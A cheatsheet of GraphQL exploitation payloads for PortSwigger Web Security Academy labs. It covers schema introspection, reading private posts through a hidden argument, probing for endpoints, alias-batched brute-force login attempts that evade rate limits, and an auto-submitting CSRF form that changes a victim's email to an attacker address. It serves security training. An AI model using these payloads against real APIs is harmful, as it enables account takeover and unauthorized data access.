# 🕸️ GraphQL API Vulnerabilities Cheatsheet

Complete exploitation methodologies, introspection queries, alias-based rate-limit bypasses, and CSRF attack templates for GraphQL APIs in PortSwigger Web Security Academy.

---

## 📌 Core Mechanisms & Discovery

* **Common Endpoints:** Look for `/graphql`, `/api/graphql`, `/v1/graphql`, or `/express-graphql` via POST or GET requests.
* **Introspection:** Enables querying the API for its schema, available types, fields, and queries.
* **Batching & Aliasing:** Allows sending multiple queries or mutations in a single HTTP request to bypass traditional rate-limiting protections.

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Data Exposure & Introspection

**Accessing private GraphQL posts**
Query hidden attributes or arguments (such as `postPassword`) within query variables to access unauthorized/private posts:

```graphql
query getPost($id: Int!, $postPassword: String) {
    getPost(id: $id, postPassword: $postPassword) {
        title
        content
        isPrivate
    }
}
```

**Accidental exposure of private GraphQL fields**
Execute introspection queries (manually or via InQL extension) to discover hidden admin fields, password hashes, or sensitive user properties:

```graphql
{
    __schema {
        types {
            name
            fields {
                name
                type {
                    name
                    kind
                }
            }
        }
    }
}
```

**Finding a hidden GraphQL endpoint**
Probe non-standard paths using GET/POST requests or append `?query=query{__schema{types{name}}}` to uncover obscured endpoints (e.g., `/api/v1/graphql` or obfuscated routes):

```http
POST /api/graphql HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json

{"query": "{__schema{queryType{name}}}"}
```

---

### 2. Rate Limit Bypass & CSRF Exploitation

**Bypassing GraphQL brute force protections**
Use GraphQL aliases to execute hundreds of login attempts within a single HTTP request, bypassing IP-based or per-request rate limiters:

```graphql
mutation {
    op1: login(input: {username: "carlos", password: "password1"}) { success result }
    op2: login(input: {username: "carlos", password: "password2"}) { success result }
    op3: login(input: {username: "carlos", password: "password3"}) { success result }
}
```

**Performing CSRF exploits over GraphQL**
Exploit GraphQL endpoints accepting `GET` requests or `application/x-www-form-urlencoded` POST requests lacking CSRF token verification:

```html
<form action="[https://YOUR-LAB-ID.web-security-academy.net/graphql](https://YOUR-LAB-ID.web-security-academy.net/graphql)" method="POST">
    <input type="hidden" name="query" value="mutation { changeEmail(email: &quot;attacker@exploit.net&quot;) { success } }" />
    <input type="submit" value="Submit" />
</form>
<script>document.forms[0].submit();</script>
```

---
